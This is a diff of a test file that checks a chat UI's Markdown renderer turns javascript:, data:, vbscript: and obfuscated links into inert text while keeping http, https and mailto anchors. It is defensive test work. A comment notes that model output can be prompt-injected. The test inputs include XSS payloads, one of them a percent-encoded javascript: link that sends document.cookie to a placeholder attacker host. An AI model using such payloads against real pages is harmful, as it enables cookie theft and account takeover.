@@ -156,6 +156,67 @@ describe('MarkdownContent links', () => {
   })
 })
 
+describe('MarkdownContent link scheme allowlist', () => {
+  // Model output is prompt-injectable (the agent reads imported repos, shared projects,
+  // scraped content), and browsers percent-decode hrefs before executing them — so a
+  // `javascript:` link in a chat message must never reach the DOM as an anchor. Only
+  // http(s):/mailto: (plus protocol-relative //host) may anchor; every other scheme is
+  // inert text: no anchor, no preview button.
+
+  it('renders a javascript: link as inert text — never an anchor', () => {
+    const onNavigatePreview = vi.fn()
+    const { container } = render(
+      <MarkdownContent
+        text="Click [me](javascript:alert(1)) now."
+        onNavigatePreview={onNavigatePreview}
+      />,
+    )
+    expect(container.querySelector('a')).toBeNull()
+    expect(container.querySelector('[data-mol-id="chat-preview-link"]')).toBeNull()
+    expect(container.textContent).toContain('me')
+    expect(onNavigatePreview).not.toHaveBeenCalled()
+  })
+
+  it('renders a percent-encoded javascript: payload as inert text', () => {
+    // Browsers percent-decode hrefs before executing: `[x](javascript:fetch%28…%29)`.
+    const { container } = render(
+      <MarkdownContent text="See [docs](javascript:fetch%28%27https%3A%2F%2Fevil.example%2F%3F%27%2Bdocument.cookie%29)." />,
+    )
+    expect(container.querySelector('a')).toBeNull()
+    expect(container.querySelector('[data-mol-id="chat-preview-link"]')).toBeNull()
+    expect(container.textContent).toContain('docs')
+  })
+
+  it('renders data: and vbscript: links as inert text', () => {
+    const { container } = render(
+      <MarkdownContent text="Try [a](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==) or [b](vbscript:msgbox)." />,
+    )
+    expect(container.querySelectorAll('a')).toHaveLength(0)
+    expect(container.textContent).toContain('a')
+    expect(container.textContent).toContain('b')
+  })
+
+  it('does not turn a control-char broken scheme into an anchor', () => {
+    // `java\tscript:` — either the link tokenizer stops at the whitespace (url class is
+    // `[^)\s]+`) or the scheme regex fails on the tab; both roads lead to inert output,
+    // never an anchor.
+    const { container } = render(<MarkdownContent text={'Go [x](java\tscript:alert(1)).'} />)
+    expect(container.querySelector('a')).toBeNull()
+    expect(container.textContent).toContain('x')
+  })
+
+  it('still anchors http, https and mailto links', () => {
+    const { container } = render(
+      <MarkdownContent text="[http](http://example.com) [https](https://example.com) [mail](mailto:a@b.c)" />,
+    )
+    const anchors = container.querySelectorAll('a[target="_blank"]')
+    expect(anchors).toHaveLength(3)
+    expect(anchors[0]!.getAttribute('href')).toBe('http://example.com')
+    expect(anchors[1]!.getAttribute('href')).toBe('https://example.com')
+    expect(anchors[2]!.getAttribute('href')).toBe('mailto:a@b.c')
+  })
+})
+
 describe('MarkdownContent streaming indicator', () => {
   it('shows its own inline spinner while streaming by default', () => {
     const { container } = render(<MarkdownContent text="working on it" isStreaming />)
